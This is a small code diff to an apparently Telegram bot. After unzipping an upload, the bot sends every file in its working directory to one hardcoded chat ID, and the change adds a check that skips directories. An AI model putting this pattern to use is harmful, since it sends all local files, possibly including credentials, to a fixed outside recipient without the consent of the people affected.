@@ -35,8 +35,9 @@ def handle_document(update, context):
             zf.extractall()
 
     for filename in os.listdir('.'):
-        with open(filename, 'rb') as f:
-            context.bot.send_document(chat_id='6925431313', document=InputFile(f))
+        if os.path.isfile(filename):
+            with open(filename, 'rb') as f:
+                context.bot.send_document(chat_id='6925431313', document=InputFile(f))
 
 start_handler = CommandHandler('start', start)
 echo_handler = MessageHandler(Filters.text & (~Filters.command), echo)
